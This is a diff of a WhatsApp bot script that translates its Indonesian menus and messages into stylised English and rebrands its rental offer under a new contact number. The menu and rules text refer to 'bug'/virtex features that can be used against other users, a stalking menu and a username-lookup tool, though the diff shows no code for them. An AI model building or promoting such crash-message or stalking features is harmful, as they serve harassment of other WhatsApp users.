           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
-          id: `.infobot`, 
-        },
-      ]
-    }
-  ]
-}
-    listbut2(m.chat, HydroSad, bet, m)
-}
-break
-case 'digitaloceanmenu': {
-  let HydroSad = `${digitaloceanmenu(prefix, hituet)}`
-const bet = {
-  title: "LIST MENU",
-  sections: [
-    {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
-      rows: [
-        {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
-          id: `.allmenu`, 
-        },
-      ]
-    },
-    {
-      title: `List menu yang dipisahkan`, 
-      highlight_label: ``,
-      rows: [
-        {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
-          id: `.bacaperaturan`, 
-        },
-        {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
-          id: `.donasi`, 
-        },
-        {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
-          id: `.ownermenu`, 
-        },
-        {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
-          id: `.groupmenu`, 
-        },
-        {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
-          id: `.gamemenu`, 
-        },
-        {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
-          id: `.storemenu`, 
-        },
-        {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
-          id: `.cpanelmenu`, 
-        },
-        {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
-          id: `.pushmenu`, 
-        },
-        {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
-          id: `.downloadmenu`, 
-        },
-        {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
-          id: `.aimenu`, 
-        },
-        {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
-          id: `.nsfwmenu`, 
-        },
-        {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
-          id: `.animemenu`, 
-        },
-        {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
-          id: `.ephoto360menu`, 
-        },
-        {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
-          id: `.funmenu`, 
-        },
-        {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
-          id: `.islamimenu`, 
-        },
-        {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
-          id: `.databasemenu`, 
-        },
-        {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
-          id: `.othermenu`, 
-        },
-        {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
-          id: `.rpgmenu`, 
-        },
-        {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
-          id: `.domainmenu`, 
-        },
-        {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
-          id: `.anonymousmenu`, 
-        },
-        {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
-          id: `.randomvideomenu`, 
-        },
-        {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
-          id: `.randomphotomenu`, 
-        },
-        {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
-          id: `.stickermenu`, 
-        },
-        {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
-          id: `.quotesmenu`, 
-        },
-        {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
-          id: `.stalkermenu`, 
-        },
-        {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
-          id: `.bugmenu`, 
-        },
-        {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
-          id: `.digitaloceanmenu`, 
-        },
-        {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
-          id: `.pyterodactylemenu`, 
-        },
-      ]
-    },
-    {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
-      rows: [
-        {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
-        },
-        {
-          title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
-          id: `.rating`,
-        },
-        {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -10151,25 +9875,29 @@ case 'bacaperaturan':
 case 'rules': {
   const cap = `┏━━━°❀ ❬ *Rules ${botname} MultiDevice* ❭ ❀°━━━┓
 
-1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.
+1. ✧ *No spamming the bot.* If caught, you will be banned.
 
-2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.
+2. ✧ If the bot doesn’t respond once, try again.  
+   If it still doesn’t respond, it’s likely delay—wait before using.
 
-3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)
+3. ✧ *Do not spam the bot unnecessarily.* Respect usage, especially if you haven’t supported it.
 
-4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.
+4. ✧ If your limit is exhausted, play games to earn more EXP.  
+   Example: Quiz, RPG, and more.
 
-5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v
+5. ✧ *Sending virtex/bug to the bot is strictly prohibited*, even if ineffective.
 
-6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.
+6. ✧ *Do NOT call the bot.* You will be automatically blocked.
 
-7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.
+7. ✧ If you don’t understand how to use the bot, ask other members  
+   or join the group using: *#gcbot*
 
-8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.
+8. ✧ Found an error or confused about a feature?  
+   Contact or report to the owner.
 
-9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.
+9. ✧ If the bot is experiencing delay, *do not spam commands.*
 
-10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.
+10. ✧ *Premium users are strictly forbidden from abusing bug features on others.*
 
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 `
@@ -10189,7 +9917,7 @@ quoted: m
 })
 break
 case 'subdomain': {
-const text12 = `Hai Kak @${sender.split("@")[0]}
+const text12 = `Hi Fam @${sender.split("@")[0]}
 
 ❏━━『 *LIST DOMAIN BY ${ownername}* 』━━
 ┣•○⊱d1 kedai-panel.my.id
@@ -10241,8 +9969,9 @@ const text12 = `Hai Kak @${sender.split("@")[0]}
 ┗━═┅═━━━๑
    ©${botname}
 *NOTE :*
-•○⊱𝙎𝙚𝙨𝙖𝙢𝙖 𝙈𝙚𝙢𝙗𝙚𝙧 𝘿𝙞 𝙇𝙖𝙧𝙖𝙣𝙜 𝙎𝙖𝙡𝙞𝙣𝙜 𝘿𝘿𝙊𝙎
-•○⊱𝘽𝙤𝙡𝙚𝙝 𝘿𝙞 𝙋𝙖𝙠𝙚 𝙐𝙣𝙩𝙪𝙠 𝙒𝙃𝙈/𝘾𝙥𝙖𝙣𝙚𝙡 𝘼𝙨𝙖𝙡 𝙉𝙜𝙤𝙩𝙖𝙠`
+•○⊱ 𝙈𝙚𝙢𝙗𝙚𝙧𝙨 𝙖𝙧𝙚 𝙨𝙩𝙧𝙞𝙘𝙩𝙡𝙮 𝙛𝙤𝙧𝙗𝙞𝙙𝙙𝙚𝙣 𝙛𝙧𝙤𝙢 𝙝𝙖𝙧𝙢𝙞𝙣𝙜 𝙤𝙧 𝙙𝙞𝙨𝙧𝙪𝙥𝙩𝙞𝙣𝙜 𝙚𝙖𝙘𝙝 𝙤𝙩𝙝𝙚𝙧.
+
+•○⊱ 𝘽𝙤𝙩 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨 𝙢𝙖𝙮 𝙤𝙣𝙡𝙮 𝙗𝙚 𝙪𝙨𝙚𝙙 𝙛𝙤𝙧 𝙡𝙚𝙜𝙞𝙩𝙞𝙢𝙖𝙩𝙚 𝙖𝙣𝙙 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙞𝙗𝙡𝙚 𝙥𝙪𝙧𝙥𝙤𝙨𝙚𝙨.`
 hydro.sendMessage(m.chat, {
 text: text12,
 contextInfo: {
@@ -11535,7 +11264,7 @@ case 'ttsba': {
   break;
 }
 case 'userfinder': case 'userfind': {
-   if (!text) return replyhydro('`Contoh :` *userfind focabar*')
+   if (!text) return replyhydro('⚔️ `Example:` *userfind aizen*')
 async function checkSocialMedia(username) {
 
 const platforms = {
@@ -11655,7 +11384,7 @@ const platforms = {
     return results;
 }
 const result = await checkSocialMedia(text);
-await replyhydro("tunggu 1/2 menit soalnya emang lama nunggunya")
+await replyhydro("⚔️ Processing... please wait 1–2 minutes.")
 let teks = `- Social Media Analysis\n\n`
                 for (let i of result) {
                     teks += `*Platforms* : ${i.platform}\n*Available* : ${i.available}\n*Link* : ${i.link}\n\n`
@@ -12776,7 +12505,7 @@ case 'reportbug': {
             teks1 = `\n\n*User* : @${
    m.sender.split("@")[0]
   }\n*Request/Bug* : ${text}`
-            teks2 = `\n\n*Hai ${pushname}, Permintaan Anda telah diteruskan ke Pemilik saya*.\n*Harap tunggu...*`
+            teks2 = `\n\n*Hi ${pushname}, your request has been forwarded to my owner.*\n*Please wait while it’s being processed...*`
             for (let i of owner) {
 hydro.sendMessage(i + "@s.whatsapp.net", {
 text: textt + teks1,
@@ -12797,7 +12526,7 @@ quoted: m,
 case 'q': case 'quoted': {
 if (!m.quoted) return replyhydro('Reply the Message!!')
 let xeonquotx= await hydro.serializeM(await m.getQuotedObj())
-if (!xeonquotx.quoted) return replyhydro('Pesan yang Anda balas tidak dikirim oleh bot')
+if (!xeonquotx.quoted) return replyhydro('⚠️ Invalid reply. This message was not sent by the bot.')
 await xeonquotx.quoted.copyNForward(m.chat, true)
 }
 break
@@ -12852,7 +12581,7 @@ case 'twitter': {
   function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
-if (!text) return reply('Linknya mana, bro..');
+if (!text) return reply('⚠️ Where is the link?');
 try {
   hydro.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
 let { SD, HD, desc, thumb, audio } = await fg.twitter(text)
@@ -12872,16 +12601,16 @@ break
 case 'tiktok':
 case 'tt': {
   if (!m.isGroup) return replytolak(mess.only.group)
-  if (!text) return replyhydro(`📌 Contoh: ${prefix + command} https://vt.tiktok.com/...`)
+  if (!text) return replyhydro(`📌 Example: ${prefix + command} https://vt.tiktok.com/...`)
 
   if (userLimit.limit < 2)
-    return replyhydro(`Limit kamu kurang!\nButuh *2* limit.\n> Sisa limit: *${userLimit.limit}*`)
+    return replyhydro(`⚔️ Limit insufficient!\nRequires *2* usage.\n> Remaining: *${userLimit.limit}*`)
 
   await hydro.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } })
 
   try {
     const data = await tiktokDl(text)
-    if (!data || !data.status) return replyhydro('❌ Gagal mengambil data.')
+    if (!data || !data.status) return replyhydro('⚔️ Failed to retrieve data. Please try again later.')
 
     const title = data.title
     const author = data.author.nickname
@@ -13014,7 +12743,7 @@ case 'ttaudio':
 case 'tiktokaudio':
 case 'ttmp3':
 case 'tiktokmp3': {
-  if (!text) return replyhydro(`📌 Contoh penggunaan:\n${prefix + command} https://vt.tiktok.com/...`);
+  if (!text) return replyhydro(`⚔️ Example usage:\n${prefix + command} https://vt.tiktok.com/...`);
   hydro.sendMessage(m.chat, { react: { text: '🎶', key: m.key } });
 
   try {
@@ -13026,7 +12755,7 @@ case 'tiktokmp3': {
       res?.data?.music_info?.[0]?.url;
 
     if (!res?.status || !audioUrl) {
-      throw new Error('Audio tidak ditemukan');
+      throw new Error('⚔️ Audio not found');
     }
 
     await hydro.sendMessage(m.chat, {
@@ -13037,7 +12766,7 @@ case 'tiktokmp3': {
 
   } catch (err) {
     console.error('❌ Error tiktokaudio:', err);
-    replyhydro('❌ Gagal mengambil audio dari TikTok.');
+replyhydro('⚔️ Failed to fetch TikTok audio. Please try again.');
   }
 }
 break;
@@ -13074,34 +12803,34 @@ break
 case 'sewa':
 case 'sewabot': {
  try {
- const sun = `╭━━〔 ʜᴀʀɢᴀ ꜱᴇᴡᴀ ʜʏᴅʀᴏ ʙᴏᴛ 〕━━╮
+ const sun = `╭━━━°❀ ❬ *ᴀɪᴢᴇɴ ꜱʏꜱᴛᴇᴍ ʀᴇɴᴛᴀʟ ᴘʀɪᴄᴇꜱ* ❭ ❀°━━━┓
 │
-│➤ 🌤️ ꜱᴇᴡᴀ ʜᴀʀɪᴀɴ
-│ • 1 ʜᴀʀɪ — ʀᴘ 1.000
-│ • 3 ʜᴀʀɪ — ʀᴘ 3.500
-│ • 7 ʜᴀʀɪ — ʀᴘ 6.000
+│➤ 🌤️ ᴅᴀɪʟʏ ᴀᴄᴄᴇꜱꜱ
+│ • 1 ᴅᴀʏ — ʀᴘ 1.000
+│ • 3 ᴅᴀʏꜱ — ʀᴘ 3.500
+│ • 7 ᴅᴀʏꜱ — ʀᴘ 6.000
 │
-│➤ 📆 ꜱᴇᴡᴀ ᴍɪɴɢɢᴜᴀɴ
-│ • 14 ʜᴀʀɪ — ʀᴘ 10.500
-│ • 21 ʜᴀʀɪ — ʀᴘ 16.000
+│➤ 📆 ᴇxᴛᴇɴᴅᴇᴅ ᴀᴄᴄᴇꜱꜱ
+│ • 14 ᴅᴀʏꜱ — ʀᴘ 10.500
+│ • 21 ᴅᴀʏꜱ — ʀᴘ 16.000
 │
-│➤ 🗓️ ꜱᴇᴡᴀ ʙᴜʟᴀɴᴀɴ
-│ • 1 ʙᴜʟᴀɴ — ʀᴘ 20.000
-│ • 2 ʙᴜʟᴀɴ — ʀᴘ 35.000
-│ • 3 ʙᴜʟᴀɴ — ʀᴘ 55.000
+│➤ 🗓️ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇꜱꜱ
+│ • 1 ᴍᴏɴᴛʜ — ʀᴘ 20.000
+│ • 2 ᴍᴏɴᴛʜꜱ — ʀᴘ 35.000
+│ • 3 ᴍᴏɴᴛʜꜱ — ʀᴘ 55.000
 │
-│≈ ᴛɪᴅᴀᴋ ᴍᴇɴʏᴇᴅɪᴀᴋᴀɴ ꜱᴇᴡᴀ ᴘᴇʀᴍᴀɴᴇɴ
+│≈ ᴘᴇʀᴍᴀɴᴇɴᴛ ᴀᴄᴄᴇꜱꜱ ɪꜱ ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ
 ╰━━━━━━━━━━━━━━━━╯
 
-✦ ───〔 ɴᴏᴛᴇ 〕─── ✦
-• ʙᴏᴛ ᴀᴋᴛɪꜰ 24 ᴊᴀᴍ
-• ꜰᴀꜱᴛ ʀᴇꜱᴘᴏɴ + ʙᴀɴʏᴀᴋ ꜰɪᴛᴜʀ
-• ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ
-• ᴄᴜꜱᴛᴏᴍ ᴘʀᴇꜰɪx
-• ʙɪꜱᴀ ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ᴍᴇᴅꜱᴏꜱ
-• ᴅᴀɴ ᴍᴀꜱɪʜ ʙᴀɴʏᴀᴋ ꜰɪᴛᴜʀ ɢʀᴜᴘ ʟᴀɪɴɴʏᴀ`;
+✦ ───〔 ⚔️ ꜱʏꜱᴛᴇᴍ ɴᴏᴛᴇ 〕─── ✦
+• ᴀɪᴢᴇɴ ꜱʏꜱᴛᴇᴍ ᴀᴄᴛɪᴠᴇ 24 ʜᴏᴜʀꜱ
+• ꜰᴀꜱᴛ ʀᴇꜱᴘᴏɴꜱᴇ + ᴍᴜʟᴛɪᴘʟᴇ ꜰᴇᴀᴛᴜʀᴇꜱ
+• ᴏᴘᴛɪᴍɪᴢᴇᴅ ꜰᴏʀ ɢʀᴏᴜᴘ ᴄᴏɴᴛʀᴏʟ
+• ᴄᴜꜱᴛᴏᴍ ᴘʀᴇꜰɪx ꜱᴜᴘᴘᴏʀᴛ
+• ꜱᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅ ꜰᴇᴀᴛᴜʀᴇ
+• ᴀᴅᴅɪᴛɪᴏɴᴀʟ ꜱʏꜱᴛᴇᴍ ᴄᴀᴘᴀʙɪʟɪᴛɪᴇꜱ ᴀᴠᴀɪʟᴀʙʟᴇ`;
 
- const sellerUrl = 'https://wa.me/6285187063723?text=Kak+mau+sewabot';
+ const sellerUrl = `https://wa.me/233533416608?text=⚔️%20${pushname}%20is%20requesting%20access%20to%20Aizen%20System`;
  const groupUrl = global.wagc;
 
  const media = await prepareWAMessageMedia(
@@ -13124,14 +12853,14 @@ case 'sewabot': {
  {
  name: "cta_url",
  buttonParamsJson: JSON.stringify({
- display_text: "Pesan Sekarang",
+ display_text: "⚔️ Request Access",
  url: sellerUrl
  })
  },
  {
  name: "cta_url",
  buttonParamsJson: JSON.stringify({
- display_text: "Bergabung Ke Grup",
+ display_text: "⚔️ Join System Group",
  url: groupUrl
  })
  }
@@ -13147,8 +12876,14 @@ case 'sewabot': {
  } catch (e) {
  await hydro.sendMessage(m.chat, {
  image: fs.readFileSync('./data/image/sewa.png'),
- caption: `${sun}\n\nPesan: https://wa.me/6285187063723?text=Kak+mau+sewabot\nGrup: ${global.wagc}`
- }, { quoted: m });
+ caption: `${sun}
+
+⚔️ *Request Access:*
+https://wa.me/233533416608?text=⚔️%20Requesting%20access%20to%20Aizen%20System
+
+👥 *System Group:*
+${global.wagc}`
+}, { quoted: m });
  }
 }
 break
@@ -13181,7 +12916,7 @@ case 'tourl': {
             if (res.data && res.data.status && res.data.path) {
                 return res.data.path;
             }
-            throw new Error("Upload ke Termai gagal");
+            throw new Error("⚔️ Upload to Termai failed");
         } catch (err) {
             console.error("Termai Error:", err.message);
             return null;
@@ -13202,7 +12937,7 @@ case 'tourl': {
             const response = await axios.post("https://qu.ax/upload.php", form, {
                 headers: { ...form.getHeaders() },
             });
-            if (!response.data.success || !response.data.files?.length) throw new Error("Upload ke qu.ax gagal");
+            if (!response.data.success || !response.data.files?.length) throw new Error("Upload to qu.ax failed");
             return response.data.files[0].url;
         } catch (err) {
             console.error("Pomf2 Error:", err.message);
@@ -13242,7 +12977,7 @@ case 'tourl': {
             if (response.data.success && response.data.files?.[0]) {
                 return `https://cdn.ypnk.biz.id${response.data.files[0].url}`;
             }
-            throw new Error("Upload ke cdn.ypnk.biz.id gagal");
+            throw new Error("Upload to cdn.ypnk.biz.id failed");
         } catch (err) {
             console.error("Ypnk Error:", err.message);
             return null;
@@ -13252,7 +12987,7 @@ case 'tourl': {
     // Upload ke tmpfiles.org
     async function uploadTmpFiles(filePath) {
         try {
-            if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
+            if (!fs.existsSync(filePath)) throw new Error("⚔️ File not found");
             const form = new FormData();
             form.append("file", fs.createReadStream(filePath));
             const res = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
@@ -13266,7 +13001,7 @@ case 'tourl': {
                     return `https://tmpfiles.org/dl/${idMatch[1]}/${fileName}`;
                 }
             }
-            throw new Error("Upload ke tmpfiles.org gagal");
+            throw new Error("Upload to tmpfiles.org failed");
         } catch (err) {
             console.error("TmpFiles Error:", err.message);
             return null;
@@ -13336,7 +13071,7 @@ case 'tourl': {
                 }),
                 body: proto.Message.InteractiveMessage.Body.create({ text: caption }),
                 footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "Tekan tombol di bawah untuk menyalin tautan."
+                    text: "⚔️ Tap the button below to copy the link."
                 }),
                 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                     buttons: [
@@ -13400,10 +13135,10 @@ case 'whatmusic': {
         if (!res.data) return reply(`Lagu tidak ditemukan.`);
         
         let { artists, title } = res.data;
